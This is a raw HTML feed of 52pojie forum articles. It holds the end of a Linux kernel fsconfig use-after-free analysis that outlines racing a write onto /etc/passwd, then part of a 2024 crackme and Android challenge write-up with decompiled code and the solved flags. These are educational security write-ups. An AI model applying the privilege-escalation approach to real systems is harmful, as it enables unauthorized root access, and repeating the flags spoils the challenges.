src="https://https://wechat2rss.xlab.app/img-proxy/?k=9966c07d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKh4yYO8Ky47C1tHFAFc2WxsPtZpEGyWtN4Eoib3ZFfNt2e9vUSnKadZQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>这里会有调用刚刚的 <code style="font-family: SFMono-Regular, Consolas, ;">cgroup1_parse_param</code>，当然也可以直接下断点 <code style="font-family: SFMono-Regular, Consolas, ;">continue</code> 过去。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=e1d8e618&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9aCaSuFIZrs6DtFFghVnIDrx8XEsNf5oLVNEqOK16dp3EAKuvfsibmA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>当然这里可以看到 <code style="font-family: SFMono-Regular, Consolas, ;">source</code> 直接被取走了，保存到了 <code style="font-family: SFMono-Regular, Consolas, ;">fc</code> 结构当中。</p><p>随后下断在 <code style="font-family: SFMono-Regular, Consolas, ;">fscontext_release</code>，然后 <code style="font-family: SFMono-Regular, Consolas, ;">continue</code> 过去，走到 <code style="font-family: SFMono-Regular, Consolas, ;">kfree</code> 这和位置可以发现 <code style="font-family: SFMono-Regular, Consolas, ;">source</code> 被释放。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a854ffa2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9QGRG15RN0WXar0206ibxKlVXuQCKVYVwXZNDfKK8zF8luwBh4zHxaQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>这里也能看到作者原意是想在这里释放 <code style="font-family: SFMono-Regular, Consolas, ;">source</code> 字符串，但是这里释放了 <code style="font-family: SFMono-Regular, Consolas, ;">file</code> 文件结构指针，调试的时候可以和之前对一下，发现地址是一致的，因此这里造成了 uaf。</p><h3>延长竞争时间</h3><p>这里采用 <code style="font-family: SFMono-Regular, Consolas, ;">writev</code> 写入大量数据使得文件拿锁的时间加长。为了调试 <code style="font-family: SFMono-Regular, Consolas, ;">exp</code>，可以用 <code style="font-family: SFMono-Regular, Consolas, ;">add-symbol-file</code> 命令去添加符号，这里可以选择断 <code style="font-family: SFMono-Regular, Consolas, ;">write_cmd</code> 的 <code style="font-family: SFMono-Regular, Consolas, ;">writev</code> 函数，因为这里会因为写入数据量过大而长期持有锁，writev 就会尝试持续获得锁。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=cc34460c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKobv3ScTdumMGgVy7s004TcPC57owjahuSb5bG7uY9OQ3tqvBU0FM1w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>随后经过系统调用来到 <code style="font-family: SFMono-Regular, Consolas, ;">do_writev</code> 函数</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4461bbc7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKGhLZqBlbsv8gLBZJTGdp1JrKLApHI4H2c23Md3icIup6P6UoreLbssw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>不过这里多线程比较难调，也不放调试具体过程了，感觉原理还是比较浅显易懂的。</p><h2>总结</h2><p>我们可以总结出以下的利用思路：</p><ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">fsconfig</code> 系统调用的代码存在类型混淆漏洞，间接导致了可以使得某文件描述符结构被 <code style="font-family: SFMono-Regular, Consolas, ;">uaf</code></p></li><li style="margin-left: 2px;"><p>通过写入大量数据延长竞争时间，通过建立一个链接的方式绕过 <code style="font-family: SFMono-Regular, Consolas, ;">open</code> 时赋予的标记位，使得两个线程可以卡在权限校验之后。</p></li><li style="margin-left: 2px;"><p>第三个线程在第二个线程卡住的时间申请 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code> 文件的结构，替换线程 2 正在写入的文件，完成漏洞利用。</p></li></ul><p>分析的还有很多不足之处，如果有讲的不好的地方恳请师傅多多包涵并帮助指正。</p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1900181-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 15 Mar 2024 17:27:50 +0800</pubDate>
</item>
<item>
<title>吾爱破解2024红包题部分WriteUP</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140291&amp;idx=1&amp;sn=4bb26af6072119b8e0757b8aece7ddec&amp;chksm=bd50a0978a272981aa38bdeb24ded75053a2fa778362ee986b6c8dcade3091baaae0e0072437&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140291&amp;idx=1&amp;sn=4bb26af6072119b8e0757b8aece7ddec&amp;chksm=bd50a0978a272981aa38bdeb24ded75053a2fa778362ee986b6c8dcade3091baaae0e0072437&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-03-15 17:27</span> <span style="display: inline-block;">北京</span>
</p>

<p>第一年参加红包题目，其中有些操作可能不是那么熟练，感谢各位大佬批评指正，嗯。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=113a833c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKwrgfRiavtyhct69I5mJLXfZAvKU7ENmNYzPWyVFYhhWjhIgKdPrdP5w%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; margin-top: 0px;"><span style="font-size: 24px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">坛账号：</span>cattie</strong></span></p><p style="margin-bottom: 0px; margin-top: 0px;"><br /></p><h2>前言</h2><p><span style="font-weight: 700;">第一年参加红包题目，其中有些操作可能不是那么熟练，感谢各位大佬批评指正，嗯。</span><br />（后面的高级题太菜了不会做）</p><h2>解题领红包之二 {Windows 初级题}</h2><p><span style="font-weight: 700;">新手题：送分题完成啦来试试新手题吧，点击下方“立即申请”任务，即可获得本题Windows CrackMe题目下载地址，通过分析CrackMe获得本题正确口令的解题方法。</span></p><h3>查壳</h3><p>嗯，很好，没有壳，直接分析。<br /><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=bfb1a683&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKpicRfnm0xLThPRCgqylCWC4n3Nic8vMdmJvTmwHjhPWutg39lqVMjQNQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h3>IDA静态分析</h3><p>（这是什么鬼啊，撤了撤了）<br /><span style="font-weight: 700;">后来发现<code style="font-family: Consolas, Monaco, ;">ioCj~KCss|bQ6zbhCu$5r57$Iljkwlqj$$$?</code>这一串东西是凯撒密码加密过的密文，偏移量为3，但字典是自定义的，懒得跟踪了，直接用OD了</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">int</span> __cdecl <span style="color: rgb(255, 255, 182);">main</span>(<span style="color: rgb(255, 255, 182);">int</span> argc, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> **argv, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> **envp)<br />{<br />  <span style="color: rgb(255, 255, 182);">int</span> v3; <span style="color: rgb(124, 124, 124);">// eax</span><br />  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> v4; <span style="color: rgb(124, 124, 124);">// ebx</span><br />  <span style="color: rgb(255, 255, 182);">void</span> **v5; <span style="color: rgb(124, 124, 124);">// edi</span><br />  <span style="color: rgb(255, 255, 182);">int</span> v6; <span style="color: rgb(124, 124, 124);">// eax</span><br />  <span style="color: rgb(255, 255, 182);">void</span> **v7; <span style="color: rgb(124, 124, 124);">// ecx</span><br />  <span style="color: rgb(255, 255, 182);">void</span> **v8; <span style="color: rgb(124, 124, 124);">// edx</span><br />  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> v9; <span style="color: rgb(124, 124, 124);">// esi</span><br />  <span style="color: rgb(255, 255, 182);">bool</span> v10; <span style="color: rgb(124, 124, 124);">// cf</span><br />  <span style="color: rgb(255, 255, 182);">int</span> v11; <span style="color: rgb(124, 124, 124);">// eax</span><br />  <span style="color: rgb(255, 255, 182);">void</span> *v12; <span style="color: rgb(124, 124, 124);">// ecx</span><br />  <span style="color: rgb(255, 255, 182);">void</span> **v13; <span style="color: rgb(124, 124, 124);">// eax</span><br />  <span style="color: rgb(255, 255, 182);">void</span> *v14; <span style="color: rgb(124, 124, 124);">// ecx</span><br />  <span style="color: rgb(255, 255, 182);">void</span> *Src[<span style="color: rgb(255, 115, 253);">5</span>]; <span style="color: rgb(124, 124, 124);">// [esp+14h] [ebp-58h] BYREF</span><br />  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> v17; <span style="color: rgb(124, 124, 124);">// [esp+28h] [ebp-44h]</span><br />  <span style="color: rgb(255, 255, 182);">void</span> *Block[<span style="color: rgb(255, 115, 253);">5</span>]; <span style="color: rgb(124, 124, 124);">// [esp+2Ch] [ebp-40h] BYREF</span><br />  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> v19; <span style="color: rgb(124, 124, 124);">// [esp+40h] [ebp-2Ch]</span><br />  <span style="color: rgb(255, 255, 182);">void</span> *v20[<span style="color: rgb(255, 115, 253);">4</span>]; <span style="color: rgb(124, 124, 124);">// [esp+44h] [ebp-28h] BYREF</span><br />  <span style="color: rgb(255, 255, 182);">int</span> v21; <span style="color: rgb(124, 124, 124);">// [esp+54h] [ebp-18h]</span><br />  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> v22; <span style="color: rgb(124, 124, 124);">// [esp+58h] [ebp-14h]</span><br />  <span style="color: rgb(255, 255, 182);">int</span> v23; <span style="color: rgb(124, 124, 124);">// [esp+68h] [ebp-4h]</span><br /><br />  Src[<span style="color: rgb(255, 115, 253);">4</span>] = <span style="color: rgb(255, 115, 253);">0</span>;<br />  v17 = <span style="color: rgb(255, 115, 253);">15</span>;<br />  LOBYTE(Src[<span style="color: rgb(255, 115, 253);">0</span>]) = <span style="color: rgb(255, 115, 253);">0</span>;<br />  sub_402560(Src, <span style="color: rgb(168, 255, 96);">"ioCj~KCss|bQ6zbhCu$5r57$Iljkwlqj$$$?"</span>, <span style="color: rgb(255, 115, 253);">0x24</span>u);<br />  v23 = <span style="color: rgb(255, 115, 253);">0</span>;<br />  SetConsoleTitleA(&amp;ConsoleTitle);<br />  v21 = <span style="color: rgb(255, 115, 253);">0</span>;<br />  v22 = <span style="color: rgb(255, 115, 253);">15</span>;<br />  LOBYTE(v20[<span style="color: rgb(255, 115, 253);">0</span>]) = <span style="color: rgb(255, 115, 253);">0</span>;<br />  LOBYTE(v23) = <span style="color: rgb(255, 115, 253);">1</span>;<br />  v3 = sub_4027D0();<br />  sub_402A80(v3);<br />  sub_4031E0(&amp;dword_42E088, v20);<br />  v4 = v22;<br />  v5 = (<span style="color: rgb(255, 255, 182);">void</span> **)v20[<span style="color: rgb(255, 115, 253);">0</span>];<br />  <span style="color: rgb(150, 203, 254);">if</span> ( v21 == <span style="color: rgb(255, 115, 253);">36</span> )<br />  {<br />    sub_402490(Src);<br />    sub_401FE0();<br />    LOBYTE(v23) = <span style="color: rgb(255, 115, 253);">2</span>;<br />    v7 = Block;<br />    v8 = v20;<br />    <span style="color: rgb(150, 203, 254);">if</span> ( v19 &gt;= <span style="color: rgb(255, 115, 253);">0x10</span> )<br />      v7 = (<span style="color: rgb(255, 255, 182);">void</span> **)Block[<span style="color: rgb(255, 115, 253);">0</span>];<br />    <span style="color: rgb(150, 203, 254);">if</span> ( v4 &gt;= <span style="color: rgb(255, 115, 253);">0x10</span> )<br />      v8 = v5;<br />    <span style="color: rgb(150, 203, 254);">if</span> ( Block[<span style="color: rgb(255, 115, 253);">4</span>] == (<span style="color: rgb(255, 255, 182);">void</span> *)<span style="color: rgb(255, 115, 253);">36</span> )<br />    {<br />      v9 = <span style="color: rgb(255, 115, 253);">32</span>;<br />      <span style="color: rgb(150, 203, 254);">do</span><br />      {<br />        <span style="color: rgb(150, 203, 254);">if</span> ( *v8 != *v7 )<br />          <span style="color: rgb(150, 203, 254);">break</span>;<br />        ++v8;<br />        ++v7;<br />        v10 = v9 &lt; <span style="color: rgb(255, 115, 253);">4</span>;<br />        v9 -= <span style="color: rgb(255, 115, 253);">4</span>;<br />      }<br />      <span style="color: rgb(150, 203, 254);">while</span> ( !v10 );<br />    }<br />    v11 = sub_4027D0();<br />    sub_402A80(v11);<br />    <span style="color: rgb(150, 203, 254);">if</span> ( v19 &gt;= <span style="color: rgb(255, 115, 253);">0x10</span> )<br />    {<br />      v12 = Block[<span style="color: rgb(255, 115, 253);">0</span>];<br />      <span style="color: rgb(150, 203, 254);">if</span> ( v19 + <span style="color: rgb(255, 115, 253);">1</span> &gt;= <span style="color: rgb(255, 115, 253);">0x1000</span> )<br />      {<br />        v12 = (<span style="color: rgb(255, 255, 182);">void</span> *)*((_DWORD *)Block[<span style="color: rgb(255, 115, 253);">0</span>] - <span style="color: rgb(255, 115, 253);">1</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> ( (<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span>)(Block[<span style="color: rgb(255, 115, 253);">0</span>] - v12 - <span style="color: rgb(255, 115, 253);">4</span>) &gt; <span style="color: rgb(255, 115, 253);">0x1F</span> )<br />          _invalid_parameter_noinfo_noreturn();<br />      }<br />      sub_406010(v12);<br />    }<br />    sub_40A6EE(<span style="color: rgb(168, 255, 96);">"Pause"</span>);<br />  }<br />  <span style="color: rgb(150, 203, 254);">else</span><br />  {<br />    v6 = sub_4027D0();<br />    sub_402A80(v6);<br />    sub_40A6EE(<span style="color: rgb(168, 255, 96);">"Pause"</span>);<br />  }<br />  <span style="color: rgb(150, 203, 254);">if</span> ( v4 &gt;= <span style="color: rgb(255, 115, 253);">0x10</span> )<br />  {<br />    v13 = v5;<br />    <span style="color: rgb(150, 203, 254);">if</span> ( v4 + <span style="color: rgb(255, 115, 253);">1</span> &gt;= <span style="color: rgb(255, 115, 253);">0x1000</span> )<br />    {<br />      v5 = (<span style="color: rgb(255, 255, 182);">void</span> **)*(v5 - <span style="color: rgb(255, 115, 253);">1</span>);<br />      <span style="color: rgb(150, 203, 254);">if</span> ( (<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span>)((<span style="color: rgb(255, 255, 182);">char</span> *)v13 - (<span style="color: rgb(255, 255, 182);">char</span> *)v5 - <span style="color: rgb(255, 115, 253);">4</span>) &gt; <span style="color: rgb(255, 115, 253);">0x1F</span> )<br />        _invalid_parameter_noinfo_noreturn();<br />    }<br />    sub_406010(v5);<br />  }<br />  <span style="color: rgb(150, 203, 254);">if</span> ( v17 &gt;= <span style="color: rgb(255, 115, 253);">0x10</span> )<br />  {<br />    v14 = Src[<span style="color: rgb(255, 115, 253);">0</span>];<br />    <span style="color: rgb(150, 203, 254);">if</span> ( v17 + <span style="color: rgb(255, 115, 253);">1</span> &gt;= <span style="color: rgb(255, 115, 253);">0x1000</span> )<br />    {<br />      v14 = (<span style="color: rgb(255, 255, 182);">void</span> *)*((_DWORD *)Src[<span style="color: rgb(255, 115, 253);">0</span>] - <span style="color: rgb(255, 115, 253);">1</span>);<br />      <span style="color: rgb(150, 203, 254);">if</span> ( (<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span>)(Src[<span style="color: rgb(255, 115, 253);">0</span>] - v14 - <span style="color: rgb(255, 115, 253);">4</span>) &gt; <span style="color: rgb(255, 115, 253);">0x1F</span> )<br />        _invalid_parameter_noinfo_noreturn();<br />    }<br />    sub_406010(v14);<br />  }<br />  <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><h3>OD动态调试</h3><ol><li style="margin-left: 2px;"><p>打开OD，导入文件</p></li><li style="margin-left: 2px;"><p>使用中文搜索引擎，找到一个Success和两个Try again，以及一个Tip<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b4162062&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKqr2n5OQzZy88iakvLQic3qVYMPZgSKDxPzLNEiaobgLlegSMA95H7nCvg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br />(Caesar Cipher恺撒密码......怪不得IDA看不懂）</p></li><li style="margin-left: 2px;"><p>先看看第一个Try again<br />上方有个cmp和je，也就是说比较当前字符串长度是否长为36，如果是的话就继续判断，否则就输出 "Error, please try again"<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=73bc8672&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKEnzYUqonndBWiaxYwCnOELoEUbdqqUEN6ia2DF4tpsZ7iauyfmtRAGWUA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br />我们输入36个1，输出变为了"Wrong, please try again"，证明上述分析没有问题<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=57f8dfde&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK1OoOBmLbFiclda0uIUcy5yZHfWZxYg3XYU5Odo6Yhv24Iw49jSdhpjA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>找到"Wrong, please try again"所在位置，找到判断条件，下断点，再次输入36个1，在MMX中即可找到CM的flag<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=97201390&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKNgRdYzTlqPvbOT3H3qtS3hDyq9Qg5Ric0Afv2y8HOStYo3dib9MJeHsA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li></ol><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">Flag：fl@g{H@ppy_N3w_e@r!2o24!Fighting!!!}</span></p></blockquote><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=17849376&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKhMjVvibcEA9LHibhn0GL1qwdPk1gogT9UzQObIRkpv4PialfYjmvTD9cA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>解题领红包之三 {Android 初级题}</h2><p><span style="font-weight: 700;">题目简介：小明和李华是同学，最近小明发现李华技术进步很快，他太想进步了，于是他一直在观察李华，却发现他老是在玩圈小猫，直到一次偶然发现，小明惊呼:“WC，原。。。”</span></p><h3>游戏</h3><p>大家一定玩过论坛的抓小猫吧（404界面），没玩过的也没事，现在打开链接也能玩【此处感谢Ganlv佬提供的游戏】<br />作为常在水区抓猫的“抓猫高手”，是时候展现真正的“寄”术了<br />（emmm，确实有些汗流浃背）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a8838440&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKFDYZdkMwFfGfO4q3x5RJa2XbPsu9NJ8oE3rtDQOsUmDvx8sKVM3Ixw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h3>Hacker（破解游戏，调低难度）</h3><p><span style="font-weight: 700;">用7-zip打开apk文件，发现里面有抓猫猫的主程序<code style="font-family: Consolas, Monaco, ;">catch-the-cat.js</code>，</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6150c048&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKicHHiaKyerlW6sKegVn7sLjhM7JtbprZVvG4cbYMvTQyw6U3SqHFKic3w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br />这和论坛的抓猫游戏是一样诶，那就好办了<br />我们直接参照Ganlv佬的代码<br />修改一下抓猫猫的js主程序<code style="font-family: SFMono-Regular, Consolas, ;">catch-the-cat.js</code>，定位到变量<code style="font-family: SFMono-Regular, Consolas, ;">initialWallCount</code><br />把墙的数量改多一点，初始是10个所以抓不住，那么就把墙的数量改一下变成30吧（doge）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5242f994&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKur4IszG4BmdTLiaJO9UfJvw80WedDI330NxwpibggtJwVxRTyLNZUX6Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>然后替换js文件，因为文件被修改过了，所以apk需要重新签名一下<br />这里采用Lucky Patcher，打个测试签名就行了，以下安卓部分修改后都用此方式打签名，不再重复赘述<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=1b8bc28c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKscAQkFsPOXCoiatUsnYzFhib7IaOakeia81pPSv64NbnqiaQus338vBLaw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><span style="font-weight: 700;">“这下是谁该汗流浃背了呢......”</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=013e6a5f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK3HVgRk9FqY8lxR7gjVTaWPXvzkHXprYcqZYAbmsiadWZsPfibEEVW5iaw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>抓住猫，熟悉的bgm响起，看描述就猜到的标准结局......<br />“Genshin，Start！”<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=dda0f814&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK4T7SCyNd4AEOPbSKibicMXtAc6bkMKzU6vDaKX63do8agGibdzbrkg74w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f2f7f11b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9sR1KibXLdNXUx8bKVAyUME84B1LwyqibkZ8TF9h5KOwrf6ZiaeCuk0Zw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">Flag：flag{happy_new_year_2024}</span></p></blockquote><h3>Disassemble（反编译dex看函数）</h3><p>说完了上面的破解游戏本体，接下来就是直接对安装包本体下手了，上apktool<br />解包发现了一个以作者名字命名的文件夹，<br />里面有MainActivity和YSQDActivity（原神启动？）<br /><img border="0" 